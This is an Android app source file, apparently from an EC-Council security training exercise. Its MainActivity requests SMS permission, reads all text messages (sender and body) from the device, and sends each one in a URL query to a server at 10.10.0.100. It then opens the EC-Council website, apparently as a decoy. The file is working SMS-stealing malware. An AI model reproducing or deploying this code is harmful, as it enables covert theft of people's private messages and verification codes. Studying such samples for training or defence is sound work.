package com.example.mathieu.ec_council;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import android.content.Intent;

import java.util.ArrayList;
import java.util.List;

import android.support.v7.app.AlertDialog;
import android.Manifest;
import android.content.pm.PackageManager;
import android.content.DialogInterface;
import android.os.Build;


public class MainActivity extends AppCompatActivity {

    final private int REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS = 124;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

    List<String> permissionsNeeded = new ArrayList<String>();
    final List<String> permissionsList = new ArrayList<String>();

    if (Build.VERSION.SDK_INT >= 23) {

        if (!addPermission(permissionsList, Manifest.permission.READ_SMS))
            permissionsNeeded.add("READ_SMS");
        if (!addPermission(permissionsList, Manifest.permission.INTERNET))
            permissionsNeeded.add("INTERNET");

        if (permissionsList.size() > 0) {
            if (permissionsNeeded.size() > 0) {
                // Need Rationale
                String message = "You need to grant access to " + permissionsNeeded.get(0);
                for (int i = 1; i < permissionsNeeded.size(); i++)
                    message = message + ", " + permissionsNeeded.get(i);
                showMessageOKCancel(message,
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                requestPermissions(permissionsList.toArray(new String[permissionsList.size()]),
                                        REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS);
                            }
                        });
                return;
            }
            requestPermissions(permissionsList.toArray(new String[permissionsList.size()]),
                    REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS);
            return;
        }
        ReadSMS();
        }
        else {
            ReadSMS();
        }
    }

    private boolean addPermission(List<String> permissionsList, String permission) {
        if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
            permissionsList.add(permission);
            // Check for Rationale Option
            if (!shouldShowRequestPermissionRationale(permission))
                return false;
        }
        return true;
    }

    private void showMessageOKCancel(String message, DialogInterface.OnClickListener okListener) {
        new AlertDialog.Builder(MainActivity.this)
                .setMessage(message)
                .setPositiveButton("OK", okListener)
                .setNegativeButton("Cancel", null)
                .create()
                .show();
    }
    public ArrayList<String> smsBuffer = new ArrayList<String>();

    private void ReadSMS() {

        smsBuffer.clear();
        String url = "content://sms/";
        Uri uri = Uri.parse(url);
        String[] reqCols = new String[]{"_id", "address", "body"};
        Cursor cursor1 = getContentResolver().query(uri, reqCols, null, null, null);
        if (cursor1.getCount() > 0) {
            String count = Integer.toString(cursor1.getCount());
            Log.d("Count", count);
            while (cursor1.moveToNext()) {
                String messageId = cursor1.getString(cursor1.getColumnIndex(reqCols[0]));
                String address = cursor1.getString(cursor1.getColumnIndex(reqCols[1]));
                String msg = cursor1.getString(cursor1.getColumnIndex(reqCols[2]));
                smsBuffer.add(messageId + "," + address + "," + msg);
                ExfilSMS(smsBuffer);
            }
        }
        cursor1.close();
    }

    private void ExfilSMS(ArrayList<String> list) {
        for (String data : list) {
            String url1 = ("http://10.10.0.100/php/input.php?input=" + data);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse(url1));
            startActivity(intent);
        }
        Intent intent = new Intent(Intent.ACTION_VIEW);
        String url2 = ("https://www.eccouncil.org/");
        intent.setData(Uri.parse(url2));
        startActivity(intent);
    }
}